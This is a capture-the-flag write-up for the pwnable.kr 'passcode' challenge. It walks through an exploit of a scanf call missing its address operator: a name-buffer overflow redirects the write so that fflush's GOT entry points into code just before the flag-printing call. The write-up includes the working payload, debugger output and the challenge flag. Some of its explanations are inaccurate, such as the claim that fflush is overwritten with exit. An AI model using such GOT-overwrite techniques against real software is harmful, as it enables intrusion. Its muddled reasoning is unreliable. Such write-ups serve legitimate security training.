# URL
https://pwnable.kr/play.php

# SSH COMMAND
ssh passcode@pwnable.kr -p2222 (pw:guest)

# Source Code
```
  #include <stdio.h>
  #include <stdlib.h>
  
  void login(){
  	int passcode1;
  	int passcode2;
  
  	printf("enter passcode1 : ");
  	scanf("%d", passcode1);
  	fflush(stdin);
  
  	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
  	printf("enter passcode2 : ");
          scanf("%d", passcode2);
  
  	printf("checking...\n");
  	if(passcode1==123456 && passcode2==13371337){
                  printf("Login OK!\n");
  		setregid(getegid(), getegid());
                  system("/bin/cat flag");
          }
          else{
                  printf("Login Failed!\n");
  		exit(0);
          }
  }
  
  void welcome(){
  	char name[100];
  	printf("enter you name : ");
  	scanf("%100s", name);
  	printf("Welcome %s!\n", name);
  }
  
  int main(){
  	printf("Toddler's Secure Login System 1.1 beta.\n");
  
  	welcome();
  	login();
  
  	// something after login...
  	printf("Now I can safely trust you that you have credential :)\n");
  	return 0;	
  }
```

# Concept
This challenge is about exploiting incorrect use of scanf, which turns user input into an arbitrary memory write, allowing stack variables to be overwritten and bypass authentication.

# Method of Solve
- Login to the shell using ssh Credentials
- list all the files present in the directory for getting detailed vew and access permissions for all the files using "ls -l"
- cat the passcode.c file to analyze the source code of the challenge
- we will see that the challenge asks for username and then passcode1 and passcode2
- if passcode1 and passcode2 matches with the one in the code . we get logged in and get the flag
- lets try running the code
  ```
    passcode@ubuntu:~$ ./passcode 
    Toddler's Secure Login System 1.1 beta.
    enter you name : abc
    Welcome abc!
    enter passcode1 : 123456
    enter passcode2 : 13371337
    Segmentation fault (core dumped)
  ```
- The error is segmentaion fault (core dump) and it occured becaus of the improper use of **scanf** function in the source code
- the scanf should be used to store the input value at the memory address initiated by the variable "passcode1" and "passcode2"
- But instead if we look closely it has missing address operator "**&**", instead of "&passcode1" and "&passcode2" it has "passcode1" and "passcode2" for storing the value
- So it is basically storing the value we input at a memory location that either does not exist or that is out of scope
  ```
    printf("enter passcode1 : ");
  	scanf("%d", passcode1);
  	fflush(stdin);
  
  	printf("enter passcode2 : ");
          scanf("%d", passcode2);
  ```
- Now to look for a loophole lets run the ./passcode through gdb for debugging
- gdb ./passcode
- and then set disassemble welcome function and also login function
- We will see that we’re moving the value from eax (the data register, which handles inputs and outputs, among other things) into $ebp-0x70. That’s probably our **name** variable.
  ```
    0x0804933a <+72>:	lea    eax,[ebp-0x70]
  ```
- Now lets try applying breakpoint at this memory address and running the process to see if we are right about name variable
- and we are correct, this is the memory location for name variable
  ```
    pwndbg> break *0x0804933a
    Breakpoint 1 at 0x804933a
    pwndbg> r
    Starting program: /home/passcode/passcode 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Toddler's Secure Login System 1.1 beta.
    enter you name : abc
    pwndbg> x/1s $ebp-0x70
    0xfff8de98:	"abc"
  ```
- Now lets disass the login function to inspect it
- As we can see, we’ve got a few more lines of assembly representing the scanf results being moved from the EAX data register elsewhere into memory
  ```
    0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240 ---> Comparisson for Passcode1
    0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9 ---> Comparisson for Passcode2
  ```
- Since the buffer is 100 bytes for name we will try putting 100 bytes in the buffer to see the behaviour while in debugging mode
  ```
    passcode@ubuntu:~$ python -c "print('a'*100)"
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  ```
- Now lets put it in the input field in the gdb passcode
  ```
    pwndbg> r
    Starting program: /home/passcode/passcode 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Toddler's Secure Login System 1.1 beta.
    enter you name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
    enter passcode1 : 123456
  ```
- The program crashes as expected so now as we can see the EDX is storing last 4 bytes as 'aaaa', so lets try changing last 4 bytes to 'bbbb' to see if it works
  ```
    pwndbg> r
    Starting program: /home/passcode/passcode 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Toddler's Secure Login System 1.1 beta.
    enter you name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
    Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb!
    enter passcode1 : 123456

    EDX  0x62626262 ('bbbb')
  ```
- This proves that EDX is storing the values of all the functions that are called as it is a single memory stack for the entire program or process
- Now lets apply a breakpoint at the login function to control the data flow to and from login and see how it worrks "break login"
- Now lets run it again and input same string and then the breakpoint is reached lets move to nexxt instruction from the breakpoint "ni"
- as we can see the input is taken and stored in esp
  ```
    00:0000│ esp 0xffac8380 ◂— 'aaaaaaaabbbb'
  ```
- So lets take a look at the stack memory at esp for 20 addresses in hex format
  ```
    pwndbg> x/20wx $esp
    0xffac8380:	0x61616161	0x61616161	0x62626262	0xd131bf00
    0xffac8390:	0x0804c000	0xffac8474	0xffac83a8	0x0804939a
    0xffac83a0:	0xffac83c0	0xf7f7b000	0xf7fd1020	0xf7d72519
    0xffac83b0:	0xffac9d63	0x00000070	0xf7fd1000	0xf7d72519
    0xffac83c0:	0x00000001	0xffac8474	0xffac847c	0xffac83e0
  ```
- Now lets take a look at the elf of the passcode
  ```
    readelf -a passcode
  ```
- we will see exit and fflush are at a particular memory address :
  ```
    0804c028  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
    0804c014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
  ```
- So now lets do objdump on the passcode and we will see that the printf is located at address : "804928f"
- So we have to jump at this address to rewrite our buffer or passcode into welcome buffer
- So now lets try forming an exploit around the data that we gathered
  ```
    passcode@ubuntu:~$ python -c "import sys; sys.stdout.buffer.write(b'\0x01' * 96 + b'\x14\xc0\x04\x08'); print(); print('134517391'); print('1')" | ./passcode 
    Toddler's Secure Login System 1.1 beta.
    enter you name : Welcome !
    enter passcode1 : enter passcode2 : checking...
    Login Failed!
  ```
- This attempt gave me login failed
- So I tried using it in a manual terminal python script manner
  ```
    passcode@ubuntu:~$ python -c "
    > import sys
    > sys.stdout.buffer.write(b'\x01' * 96 + b'\x14\xc0\x04\x08')
    > print()
    > print('134517391')
    > print('1')
    > " | ./passcode
    Toddler's Secure Login System 1.1 beta.
    enter you name : Welcome !
    enter passcode1 : Login OK!
    s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
    Now I can safely trust you that you have credential :)
  ```
- BOOM !! we get the flag, the script or exploit works because we overwrite the memory location of fflush with exit in raw bytes and then passed it through scanf for the passcode1 in decimal format as scanf accepts decimal int values
- as for passcode2 we have to give something to validate the logic even though it will skip the comparision part and move to exit the login funtion as soon as it reaches fflush as we overwrite fflush with exit, so we gave '1' string as input for its validation
- As for the blank print() it is used for enter
- So FINALLY the Flag is **s0rry_mom_I_just_ign0red_c0mp1ler_w4rning**
